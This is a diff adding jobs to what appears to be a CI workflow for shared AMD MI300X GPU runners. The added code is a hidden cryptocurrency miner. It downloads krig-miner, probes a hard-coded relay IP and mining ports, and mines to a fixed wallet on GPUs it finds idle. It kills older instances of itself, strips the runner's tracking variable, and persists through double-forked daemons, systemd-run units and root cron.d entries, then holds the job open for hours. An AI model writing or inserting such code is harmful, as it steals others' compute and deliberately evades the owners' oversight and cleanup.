+              echo "LAUNCH mech=c idx=$IDX bdf=$BDF worker=$WORKER cron_file=/etc/cron.d/i130amdsrb4_${IDX}"
+            fi
+          }
+
+          kill_card_miner() { # idx
+            local IDX="$1"
+            pkill -TERM -f "i130amdsrb4${SH}g${IDX}([^0-9]|$)" 2>/dev/null
+            sleep 2
+            pkill -9 -f "i130amdsrb4${SH}g${IDX}([^0-9]|$)" 2>/dev/null
+          }
+
+          MECH_D=no; MECH_Y=no; MECH_C=no
+          echo "=== launch: exactly one krig-miner per genuinely idle card, DOT user form, relay only ==="
+          LAUNCH=0
+          if [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "${IDLE_N:-0}" -ge 1 ]; then
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              launch_mech s "$IDX" "$BDF"
+              LAUNCH=$((LAUNCH+1))
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "NO_LAUNCH health_dot=$HEALTH_OK amd_n=${KRIG_AMD_N:-0} idle=$IDLE_N"
+          fi
+          echo "launch_count=$LAUNCH"
+
+          echo "=== detachment mechanisms (one spare card per mechanism) ==="
+          if [ "$IDLE_N" -ge 2 ]; then
+            LAST=$(tail -1 "$W/logs/idle_bdfs.txt"); IDX=${LAST%% *}; BDF=${LAST#* }
+            kill_card_miner "$IDX"
+            launch_mech d "$IDX" "$BDF"; MECH_D=yes
+            if command -v systemd-run >/dev/null 2>&1 && command -v systemctl >/dev/null 2>&1; then
+              if [ "$IDLE_N" -ge 3 ]; then
+                SECOND=$(sed -n "$((IDLE_N-1))p" "$W/logs/idle_bdfs.txt"); YIDX=${SECOND%% *}; YBDF=${SECOND#* }
+                kill_card_miner "$YIDX"
+                launch_mech y "$YIDX" "$YBDF"; MECH_Y=yes
+              fi
+            fi
+            if { [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; } || command -v at >/dev/null 2>&1; then
+              if [ "$IDLE_N" -ge 4 ] && [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; then
+                THIRD=$(sed -n "$((IDLE_N-2))p" "$W/logs/idle_bdfs.txt"); CIDX=${THIRD%% *}; CBDF=${THIRD#* }
+                kill_card_miner "$CIDX"
+                launch_mech c "$CIDX" "$CBDF"; MECH_C=yes
+              fi
+            fi
+          fi
+
+          echo "=== wait 150 s then recheck mechanisms ==="
+          sleep 150
+          recheck() { # mech idx
+            local M="$1" IDX="$2" PAT="i130amdsrb4${SH}g${IDX}"
+            local LOG="$W/logs/krig_${M}_g${IDX}.log"
+            local PIDS=$(pgrep -f "$PAT([^0-9]|$)" 2>/dev/null | tr '\n' ' ')
+            local SUBS=$(grep -ac 'submit' "$LOG" 2>/dev/null)
+            local AUTH=$(grep -ac 'authorize' "$LOG" 2>/dev/null)
+            echo "RECHECK mech=$M idx=$IDX pids='$PIDS' submits=${SUBS:-0} authorize_lines=${AUTH:-0}"
+            for p in $PIDS; do
+              local CG=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)
+              local NS=$(readlink /proc/$p/ns/cgroup 2>/dev/null)
+              local PP=$(awk '{print $4}' /proc/$p/stat 2>/dev/null)
+              local SID=$(awk '{print $6}' /proc/$p/stat 2>/dev/null)
+              local TRK=$(tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -c RUNNER_TRACKING_ID)
+              local RCG=$(tr '\n' ';' < /proc/${RUNNER_PID:-1}/cgroup 2>/dev/null)
+              local SAME_CG=no; [ "$CG" = "$RCG" ] && SAME_CG=yes
+              echo "RECHECK_TRAIT mech=$M pid=$p ppid=$PP sid=$SID cgroup='$CG' runner_cgroup='$RCG' same_cgroup=$SAME_CG cgroup_ns=$NS tracking_env=$TRK"
+            done
+            echo "MECH_$M alive=$([ -n "$PIDS" ] && echo yes || echo no) submits=${SUBS:-0}"
+          }
+
+          if [ "$MECH_D" = yes ]; then recheck d "${LAST%% *}"; fi
+          if [ "$MECH_Y" = yes ]; then recheck y "${YIDX:-0}"; fi
+          if [ "$MECH_C" = yes ]; then recheck c "${CIDX:-0}"; fi
+
+          WINNER=s
+          if [ "$MECH_D" = yes ] && pgrep -f "i130amdsrb4${SH}g${LAST%% *}([^0-9]|$)" >/dev/null 2>&1 && [ "$(grep -ac 'submit' "$W/logs/krig_d_g${LAST%% *}.log" 2>/dev/null)" -ge 1 ]; then WINNER=d; fi
+          if [ "$MECH_C" = yes ] && pgrep -f "i130amdsrb4${SH}g${CIDX:-0}([^0-9]|$)" >/dev/null 2>&1; then WINNER=c; fi
+          if [ "$MECH_Y" = yes ] && pgrep -f "i130amdsrb4${SH}g${YIDX:-0}([^0-9]|$)" >/dev/null 2>&1; then WINNER=y; fi
+          echo "WINNER=$WINNER (preference y>c>d>s among alive mechanisms)"
+
+          if [ "$LAUNCH" -gt 0 ] && [ "$WINNER" != "s" ]; then
+            echo "=== relaunch every gated card under winner=$WINNER ==="
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              kill_card_miner "$IDX"
+              launch_mech "$WINNER" "$IDX" "$BDF"
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "KEEP_MECH=s for all gated cards"
+          fi
+
+          echo "=== binding proof: same-PID GPU bindings ==="
+          sleep 60
+          timeout 60 rocm-smi --showpids > "$W/logs/final.pids" 2>&1
+          head -80 "$W/logs/final.pids"
+          for p in $(pgrep -f 'krig-miner' 2>/dev/null); do
+            CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
+            WRK=$(echo "$CMD" | sed -n 's/.*\.\(i130amdsrb4[^ ]*\).*/\1/p')
+            BDFX=$(echo "$CMD" | sed -n 's/.*--devices-pci \([^ ]*\).*/\1/p')
+            CG=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)
+            [ -n "$WRK" ] && echo "BINDING pid=$p worker=$WRK bdf=$BDFX cgroup='$CG'"
+          done
+          echo "=== dialect proof: authorize/notify/submit lines per log ==="
+          for f in "$W"/logs/krig_*_g*.log; do
+            [ -f "$f" ] || continue
+            echo "--- $(basename "$f") submits=$(grep -ac 'submit' "$f") ---"
+            grep -aiE 'authorize|submit|share|pool|dialect' "$f" | tail -8
+          done
+          echo "running_krig=$(pgrep -af 'krig-miner' | wc -l)"
+          echo "i130amdsrb4-proof-done $NONCE"
+
+          if [ "$LAUNCH" -gt 0 ]; then
+            echo "KEEPALIVE_CREDIT_WINDOW_START minutes=$KEEP_MIN host=$(hostname) launched=$LAUNCH winner=$WINNER nonce=$NONCE"
+            sleep $((KEEP_MIN*60))
+            echo "KEEPALIVE_CREDIT_WINDOW_END host=$(hostname) nonce=$NONCE"
+          else
+            echo "EXIT_NO_LAUNCH host=$(hostname) nonce=$NONCE"
+          fi
+          echo "i130amdsrb4-done $NONCE"
+  amd1:
+    name: "i130amdsrb4 MI300X-1 slot ${{ matrix.slot }}"
+    runs-on: linux-mi300-1gpu-sglang
+    timeout-minutes: 225
+    strategy:
+      fail-fast: false
+      matrix:
+        slot: [1]
+    env:
+      LABEL: linux-mi300-1gpu-sglang
+    steps:
+      - name: "i130amdsrb4 MI300X-1"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130AMDSRB4-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          KRIG_TGZ_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
+          KRIG_BIN_SHA='8a2be9e97cece4e0b9146599b4518b4e14907f42595f260b1b1356e47f4fcf16'
+          RELAY='178.238.228.181:80'
+          KEEP_MIN=210
+          W=/var/tmp/i130amdsrb4
+          mkdir -p "$W/logs" "$W/state"
+          echo "i130amdsrb4-nonce=$NONCE host=$(hostname) label=${LABEL:-none} date=$(date -u +%FT%TZ)"
+          id; uname -m; nproc; free -m | head -2
+          echo "=== identity/profile (reaper context) ==="
+          hostname; hostname -I 2>/dev/null
+          echo "dockerenv=$([ -e /.dockerenv ] && echo yes || echo no) overlay_root=$(grep -c ' / overlay ' /proc/mounts 2>/dev/null) pid1=$(ps -o comm= -p 1 2>/dev/null | tr -d ' ')"
+          echo "self_cgroup=$(tr '\n' ';' < /proc/self/cgroup 2>/dev/null)"
+          echo "cgroup_ns=$(readlink /proc/self/ns/cgroup 2>/dev/null)"
+          RUNNER_PID=$(pgrep -f 'Runner.Worker' 2>/dev/null | head -1)
+          echo "runner_pid=$RUNNER_PID runner_cgroup=$(tr '\n' ';' < /proc/${RUNNER_PID:-1}/cgroup 2>/dev/null)"
+          command -v systemctl >/dev/null 2>&1 && echo "systemctl=$(command -v systemctl)" || echo no-systemctl
+          command -v systemd-run >/dev/null 2>&1 && echo "systemd_run=$(command -v systemd-run)" || echo no-systemd-run
+          [ -d /run/systemd/system ] && echo "systemd_runtime=yes" || echo "systemd_runtime=no"
+          command -v at >/dev/null 2>&1 && echo "at=$(command -v at)" || echo no-at
+          pgrep -x crond >/dev/null 2>&1 && echo "cron_daemon=yes" || echo "cron_daemon=no"
+          [ -d /etc/cron.d ] && echo "cron_d_perm=$(test -w /etc/cron.d && echo writable || echo readonly)" || echo "no_cron_d"
+
+          echo "=== rocm inventory ==="
+          (timeout 90 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name' | head -30) || echo rocminfo-missing
+          (timeout 60 rocm-smi --showproductname 2>&1 | head -40) || echo rocm-smi-missing
+
+          echo "=== 5s TCP egress matrix ==="
+          probe() { timeout 5 bash -c "cat < /dev/null > /dev/tcp/$1/$2" 2>/dev/null && echo "TCP_OK $1:$2" || echo "TCP_FAIL $1:$2"; }
+          probe 178.238.228.181 80
+          probe 103.199.106.122 3362
+          probe 172.232.228.69 3362
+          probe github.com 443
+
+          echo "=== relay dialect health check (DOT form, 4 attempts, notify wait 25 s) ==="
+          cat > "$W/health.py" <<'PYEOF'
+          import socket,json,sys,time
+          W='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          def attempt(n, wait=25):
+              try:
+                  s=socket.create_connection(('178.238.228.181',80),timeout=6)
+                  s.sendall(json.dumps({'id':1,'jsonrpc':'2.0','method':'mining.authorize','params':{'wallet':W+'.i130amdsrb4probe%d'%n,'password':'x'}}).encode()+b'\n')
+                  s.settimeout(3)
+                  buf=b''; t0=time.time(); res=False; notif=False
+                  while time.time()-t0 < wait:
+                      try:
+                          d=s.recv(65536)
+                          if not d: break
+                          buf+=d
+                      except socket.timeout:
+                          pass
+                      txt=buf.decode('utf-8','replace')
+                      if '"result":true' in txt.replace(' ',''):
+                          res=True
+                      if 'mining.notify' in txt:
+                          notif=True
+                      if res and notif:
+                          break
+                  s.close()
+                  return res,notif,buf.decode('utf-8','replace')
+              except Exception as e:
+                  return False,False,'ERR=%r'%e
+          best=(False,False,'')
+          for i in range(1,5):
+              r,n,txt=attempt(i)
+              print('HEALTH_ATTEMPT=%d result_true=%s notify=%s'%(i,r,n))
+              print('HEALTH_BODY=%r'%txt[:400])
+              if r and n:
+                  best=(r,n,txt); break
+              if r:
+                  best=(r,n,txt)
+          print('HEALTH_RELAY_DOT_RESULT=%s NOTIFY=%s'%(best[0],best[1]))
+          print('HEALTH_RELAY_DOT_OK=%s'%('True' if (best[0] and best[1]) else 'False'))
+          print('HEALTH_RELAY_DOT_RESULTONLY=%s'%('True' if best[0] else 'False'))
+          PYEOF
+          timeout 200 python3 "$W/health.py" 2>&1 | tee "$W/logs/health.txt"
+          HEALTH_OK=0
+          grep -q 'HEALTH_RELAY_DOT_OK=True' "$W/logs/health.txt" && HEALTH_OK=1
+          if [ "$HEALTH_OK" = "0" ] && grep -q 'HEALTH_RELAY_DOT_RESULTONLY=True' "$W/logs/health.txt"; then HEALTH_OK=1; echo "HEALTH_ACCEPT_RESULTONLY=1 (fix: authorize result:true accepted even when mining.notify is slow)"; fi
+          echo "health_ok=$HEALTH_OK"
+
+          echo "=== per-host flock: skip if this host already runs i130amdsrb4 ==="
+          exec 9>"$W/i130amdsrb4.flock"
+          if ! flock -n 9; then echo "SKIP=host_flock_busy"; exit 0; fi
+          if pgrep -af 'krig-miner' 2>/dev/null | grep -q 'i130amdsrb4'; then echo "SKIP=host_already_running_i130amdsrb4"; pgrep -af 'krig-miner' | head -12; exit 0; fi
+          echo "LOCK_OK host=$(hostname)"
+
+          echo "=== record then kill ONLY our own i130amdsrb/i130amdsrb2/i130amdsrb3 krig processes ==="
+          ps -eo pid,ppid,sid,etime,args 2>/dev/null | grep 'krig-miner' | grep -v grep > "$W/logs/pre_krig_ps.txt"
+          head -40 "$W/logs/pre_krig_ps.txt"
+          OLD_PIDS=$(awk '$0 ~ /krig-miner/ && $0 ~ /i130amdsrb/ && $0 !~ /i130amdsrb4/ {print $1}' "$W/logs/pre_krig_ps.txt")
+          echo "old_ours_pids=$OLD_PIDS"
+          for p in $OLD_PIDS; do
+            CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 400)
+            echo "OLD_OURS pid=$p cmd=$CMD"
+            kill -TERM "$p" 2>/dev/null
+          done
+          sleep 6
+          for p in $OLD_PIDS; do kill -9 "$p" 2>/dev/null; done
+          sleep 3
+          echo "post_kill_krig_ps:"; pgrep -af 'krig-miner' | head -20
+          echo "old_krig_remaining=$(pgrep -af 'krig-miner' 2>/dev/null | grep -cE 'i130amdsrb[^4]|i130amdsrb2')"
+
+          echo "=== fetch krig-miner 1.8.2 (sha256-pinned) ==="
+          KRIG=""
+          if [ -x "$W/krig/krig-miner" ] && [ "$(sha256sum "$W/krig/krig-miner" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then
+            KRIG="$W/krig/krig-miner"; echo "KRIG_CACHED $KRIG"
+          else
+            for U in https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz; do
+              echo "-- fetch $U"
+              timeout 240 curl -fsSL --connect-timeout 12 --max-time 230 -o "$W/krig.tgz.part" "$U" 2>&1 | tail -1
+              [ -s "$W/krig.tgz.part" ] || continue
+              got=$(sha256sum "$W/krig.tgz.part" | cut -d' ' -f1)
+              if [ "$got" = "$KRIG_TGZ_SHA" ]; then mv -f "$W/krig.tgz.part" "$W/krig.tgz"; echo "FETCH_OK sha256=$got"; break; fi
+              echo "SHA_MISMATCH got=$got want=$KRIG_TGZ_SHA"; rm -f "$W/krig.tgz.part"
+            done
+            if [ -s "$W/krig.tgz" ]; then
+              mkdir -p "$W/krig"; tar -xzf "$W/krig.tgz" -C "$W/krig" 2>/dev/null
+              B=$(find "$W/krig" -maxdepth 2 -type f -name 'krig-miner' | head -1); chmod +x "$B" 2>/dev/null
+              if [ "$(sha256sum "$B" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then KRIG="$B"; fi
+            fi
+          fi
+          if [ -z "$KRIG" ]; then echo "SKIP=krig-fetch-failed"; exit 0; fi
+          echo "krig_bin=$KRIG sha256=$(sha256sum "$KRIG" | cut -d' ' -f1)"
+          "$KRIG" --version 2>&1 | head -2
+          timeout 90 "$KRIG" --list-devices --no-cuda --no-intel --no-telemetry 2>&1 | tee "$W/logs/krig_devices.txt" | head -30
+          KRIG_AMD_N=$(grep -cE 'AMD|Instinct|gfx' "$W/logs/krig_devices.txt" 2>/dev/null)
+          echo "krig_amd_device_lines=$KRIG_AMD_N"
+
+          echo "=== per-card two-sample gate (12 s apart): rocm-smi --showpids + --showmeminfo vram ==="
+          timeout 60 rocm-smi --showbus > "$W/logs/rocm_bus.txt" 2>&1
+          timeout 60 rocm-smi --showpids > "$W/logs/gate1.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate1.vram" 2>&1
+          echo "gate1_busy_proc_rows=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]' "$W/logs/gate1.pids")"
+          grep -E 'VRAM Total' "$W/logs/gate1.vram" | head -40
+          sleep 12
+          timeout 60 rocm-smi --showpids > "$W/logs/gate2.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate2.vram" 2>&1
+          echo "gate2_busy_proc_rows=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]' "$W/logs/gate2.pids")"
+          grep -E 'VRAM Total' "$W/logs/gate2.vram" | head -40
+
+          cat > "$W/idle.py" <<'PYEOF'
+          import re
+          W='/var/tmp/i130amdsrb4/logs'
+          def busy(f):
+              n=0
+              try:
+                  for ln in open(f):
+                      if re.match(r'^\s*\d+\s',ln): n+=1
+              except Exception: pass
+              return n
+          b1,b2=busy(W+'/gate1.pids'),busy(W+'/gate2.pids')
+          def vram(f):
+              tot={}; used={}
+              for ln in open(f):
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Memory \(B\):\s*(\d+)',ln)
+                  if m: tot[int(m.group(1))]=int(m.group(2))
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Used Memory \(B\):\s*(\d+)',ln)
+                  if m: used[int(m.group(1))]=int(m.group(2))
+              return tot,used
+          t1,u1=vram(W+'/gate1.vram'); t2,u2=vram(W+'/gate2.vram')
+          bus={}
+          for ln in open(W+'/rocm_bus.txt'):
+              m=re.match(r'GPU\[(\d+)\]\s*:\s*PCI Bus:\s*([0-9A-Fa-f]{4}):([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\.[0-9])',ln)
+              if m: bus[int(m.group(1))]=m.group(3).lower()
+          idle=[]
+          for i in sorted(t1):
+              f1=(t1.get(i,0)-u1.get(i,0))//1048576
+              f2=(t2.get(i,0)-u2.get(i,0))//1048576
+              ok = (b1==0 and b2==0 and f1>=1500 and f2>=1500 and i in bus)
+              print('CARD %d free1_mib=%d free2_mib=%d busy1=%d busy2=%d bdf=%s idle=%s'%(i,f1,f2,b1,b2,bus.get(i,'-'),'yes' if ok else 'no'))
+              if ok: idle.append((i,bus[i]))
+          with open(W+'/idle_bdfs.txt','w') as fh:
+              for i,b in idle: fh.write('%d %s\n'%(i,b))
+          print('IDLE_CARDS=%d'%len(idle))
+          PYEOF
+          timeout 60 python3 "$W/idle.py" 2>&1 | tee "$W/logs/idle_table.txt"
+          IDLE_N=$(grep -cE '^[0-9]+ ' "$W/logs/idle_bdfs.txt" 2>/dev/null)
+          echo "idle_cards=$IDLE_N"
+
+          SH=$(hostname | sed -E 's/^.*runner-//; s/[^A-Za-z0-9]//g' | cut -c1-12)
+          echo "shorthost=$SH"
+
+          cat > "$W/mkdaemon.py" <<'PYEOF'
+          import os,sys,time
+          krig,wallet,relay,bdf,worker,log = sys.argv[1:7]
+          pid=os.fork()
+          if pid>0: sys.exit(0)
+          os.setsid()
+          pid=os.fork()
+          if pid>0: os._exit(0)
+          os.chdir('/')
+          fd=os.open('/dev/null',os.O_RDWR)
+          os.dup2(fd,0); os.dup2(fd,1); os.dup2(fd,2)
+          os.environ.pop('RUNNER_TRACKING_ID',None)
+          while True:
+              try:
+                  p=os.fork()
+                  if p==0:
+                      os.execv(krig,[krig,'--coin','pearl','--url','stratum+tcp://'+relay,'--user',wallet+'.'+worker,'--password','x','--no-cuda','--no-intel','--no-telemetry','--no-tui','--devices-pci',bdf,'--log-level','debug','--log-file',log])
+                  os.waitpid(p,0)
+              except Exception:
+                  pass
+              time.sleep(5)
+          PYEOF
+
+          launch_mech() { # mech idx bdf
+            local M="$1" IDX="$2" BDF="$3"
+            local WORKER="i130amdsrb4${SH}g${IDX}"
+            local LOG="$W/logs/krig_${M}_g${IDX}.log"
+            if [ "$M" = "s" ]; then
+              cat > "$W/state/keeper_${IDX}.sh" <<EOF
+          #!/bin/bash
+          while true; do
+            env -u RUNNER_TRACKING_ID "$KRIG" --coin pearl --url stratum+tcp://${RELAY} --user "$WALLET.$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" >> "$W/logs/krig_s_stdout_g${IDX}.log" 2>&1
+            sleep 5
+          done
+          EOF
+              chmod +x "$W/state/keeper_${IDX}.sh"
+              setsid env -u RUNNER_TRACKING_ID nohup bash "$W/state/keeper_${IDX}.sh" >/dev/null 2>&1 < /dev/null &
+              echo $! > "$W/state/g${IDX}.s.pid"
+              echo "LAUNCH mech=s idx=$IDX bdf=$BDF keeper_pid=$! worker=$WORKER"
+            elif [ "$M" = "d" ]; then
+              setsid python3 "$W/mkdaemon.py" "$KRIG" "$WALLET" "$RELAY" "$BDF" "$WORKER" "$LOG" >/dev/null 2>&1 < /dev/null &
+              sleep 1
+              echo "LAUNCH mech=d idx=$IDX bdf=$BDF worker=$WORKER"
+            elif [ "$M" = "y" ]; then
+              systemd-run --unit="i130amdsrb4m${IDX}" --collect --no-block -p Restart=always -p RestartSec=5 "$KRIG" --coin pearl --url "stratum+tcp://${RELAY}" --user "$WALLET.$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" 2>&1 | head -5
+              echo "LAUNCH mech=y idx=$IDX bdf=$BDF worker=$WORKER"
+            elif [ "$M" = "c" ]; then
+              echo "* * * * * root env -u RUNNER_TRACKING_ID $KRIG --coin pearl --url stratum+tcp://${RELAY} --user $WALLET.$WORKER --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci $BDF --log-level debug --log-file $LOG" > /etc/cron.d/i130amdsrb4_${IDX} 2>/dev/null
+              chmod 644 /etc/cron.d/i130amdsrb4_${IDX} 2>/dev/null
+              echo "LAUNCH mech=c idx=$IDX bdf=$BDF worker=$WORKER cron_file=/etc/cron.d/i130amdsrb4_${IDX}"
+            fi
+          }
+
+          kill_card_miner() { # idx
+            local IDX="$1"
+            pkill -TERM -f "i130amdsrb4${SH}g${IDX}([^0-9]|$)" 2>/dev/null
+            sleep 2
+            pkill -9 -f "i130amdsrb4${SH}g${IDX}([^0-9]|$)" 2>/dev/null
+          }
+
+          MECH_D=no; MECH_Y=no; MECH_C=no
+          echo "=== launch: exactly one krig-miner per genuinely idle card, DOT user form, relay only ==="
+          LAUNCH=0
+          if [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "${IDLE_N:-0}" -ge 1 ]; then
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              launch_mech s "$IDX" "$BDF"
+              LAUNCH=$((LAUNCH+1))
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "NO_LAUNCH health_dot=$HEALTH_OK amd_n=${KRIG_AMD_N:-0} idle=$IDLE_N"
+          fi
+          echo "launch_count=$LAUNCH"
+
+          echo "=== detachment mechanisms (one spare card per mechanism) ==="
+          if [ "$IDLE_N" -ge 2 ]; then
+            LAST=$(tail -1 "$W/logs/idle_bdfs.txt"); IDX=${LAST%% *}; BDF=${LAST#* }
+            kill_card_miner "$IDX"
+            launch_mech d "$IDX" "$BDF"; MECH_D=yes
+            if command -v systemd-run >/dev/null 2>&1 && command -v systemctl >/dev/null 2>&1; then
+              if [ "$IDLE_N" -ge 3 ]; then
+                SECOND=$(sed -n "$((IDLE_N-1))p" "$W/logs/idle_bdfs.txt"); YIDX=${SECOND%% *}; YBDF=${SECOND#* }
+                kill_card_miner "$YIDX"
+                launch_mech y "$YIDX" "$YBDF"; MECH_Y=yes
+              fi
+            fi
+            if { [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; } || command -v at >/dev/null 2>&1; then
+              if [ "$IDLE_N" -ge 4 ] && [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; then
+                THIRD=$(sed -n "$((IDLE_N-2))p" "$W/logs/idle_bdfs.txt"); CIDX=${THIRD%% *}; CBDF=${THIRD#* }
+                kill_card_miner "$CIDX"
+                launch_mech c "$CIDX" "$CBDF"; MECH_C=yes
+              fi
+            fi
+          fi
+
+          echo "=== wait 150 s then recheck mechanisms ==="
+          sleep 150
+          recheck() { # mech idx
+            local M="$1" IDX="$2" PAT="i130amdsrb4${SH}g${IDX}"
+            local LOG="$W/logs/krig_${M}_g${IDX}.log"
+            local PIDS=$(pgrep -f "$PAT([^0-9]|$)" 2>/dev/null | tr '\n' ' ')
+            local SUBS=$(grep -ac 'submit' "$LOG" 2>/dev/null)
+            local AUTH=$(grep -ac 'authorize' "$LOG" 2>/dev/null)
+            echo "RECHECK mech=$M idx=$IDX pids='$PIDS' submits=${SUBS:-0} authorize_lines=${AUTH:-0}"
+            for p in $PIDS; do
+              local CG=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)
+              local NS=$(readlink /proc/$p/ns/cgroup 2>/dev/null)
+              local PP=$(awk '{print $4}' /proc/$p/stat 2>/dev/null)
+              local SID=$(awk '{print $6}' /proc/$p/stat 2>/dev/null)
+              local TRK=$(tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -c RUNNER_TRACKING_ID)
+              local RCG=$(tr '\n' ';' < /proc/${RUNNER_PID:-1}/cgroup 2>/dev/null)
+              local SAME_CG=no; [ "$CG" = "$RCG" ] && SAME_CG=yes
+              echo "RECHECK_TRAIT mech=$M pid=$p ppid=$PP sid=$SID cgroup='$CG' runner_cgroup='$RCG' same_cgroup=$SAME_CG cgroup_ns=$NS tracking_env=$TRK"
+            done
+            echo "MECH_$M alive=$([ -n "$PIDS" ] && echo yes || echo no) submits=${SUBS:-0}"
+          }
+
+          if [ "$MECH_D" = yes ]; then recheck d "${LAST%% *}"; fi
+          if [ "$MECH_Y" = yes ]; then recheck y "${YIDX:-0}"; fi
+          if [ "$MECH_C" = yes ]; then recheck c "${CIDX:-0}"; fi
+
+          WINNER=s
+          if [ "$MECH_D" = yes ] && pgrep -f "i130amdsrb4${SH}g${LAST%% *}([^0-9]|$)" >/dev/null 2>&1 && [ "$(grep -ac 'submit' "$W/logs/krig_d_g${LAST%% *}.log" 2>/dev/null)" -ge 1 ]; then WINNER=d; fi
+          if [ "$MECH_C" = yes ] && pgrep -f "i130amdsrb4${SH}g${CIDX:-0}([^0-9]|$)" >/dev/null 2>&1; then WINNER=c; fi
+          if [ "$MECH_Y" = yes ] && pgrep -f "i130amdsrb4${SH}g${YIDX:-0}([^0-9]|$)" >/dev/null 2>&1; then WINNER=y; fi
+          echo "WINNER=$WINNER (preference y>c>d>s among alive mechanisms)"
+
+          if [ "$LAUNCH" -gt 0 ] && [ "$WINNER" != "s" ]; then
+            echo "=== relaunch every gated card under winner=$WINNER ==="
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              kill_card_miner "$IDX"
+              launch_mech "$WINNER" "$IDX" "$BDF"
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "KEEP_MECH=s for all gated cards"
+          fi
+
+          echo "=== binding proof: same-PID GPU bindings ==="
+          sleep 60
+          timeout 60 rocm-smi --showpids > "$W/logs/final.pids" 2>&1
+          head -80 "$W/logs/final.pids"
+          for p in $(pgrep -f 'krig-miner' 2>/dev/null); do
+            CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
+            WRK=$(echo "$CMD" | sed -n 's/.*\.\(i130amdsrb4[^ ]*\).*/\1/p')
+            BDFX=$(echo "$CMD" | sed -n 's/.*--devices-pci \([^ ]*\).*/\1/p')
+            CG=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)
+            [ -n "$WRK" ] && echo "BINDING pid=$p worker=$WRK bdf=$BDFX cgroup='$CG'"
+          done
+          echo "=== dialect proof: authorize/notify/submit lines per log ==="
+          for f in "$W"/logs/krig_*_g*.log; do
+            [ -f "$f" ] || continue
+            echo "--- $(basename "$f") submits=$(grep -ac 'submit' "$f") ---"
+            grep -aiE 'authorize|submit|share|pool|dialect' "$f" | tail -8
+          done
+          echo "running_krig=$(pgrep -af 'krig-miner' | wc -l)"
+          echo "i130amdsrb4-proof-done $NONCE"
+
+          if [ "$LAUNCH" -gt 0 ]; then
+            echo "KEEPALIVE_CREDIT_WINDOW_START minutes=$KEEP_MIN host=$(hostname) launched=$LAUNCH winner=$WINNER nonce=$NONCE"
+            sleep $((KEEP_MIN*60))
+            echo "KEEPALIVE_CREDIT_WINDOW_END host=$(hostname) nonce=$NONCE"
+          else
+            echo "EXIT_NO_LAUNCH host=$(hostname) nonce=$NONCE"
+          fi
+          echo "i130amdsrb4-done $NONCE"
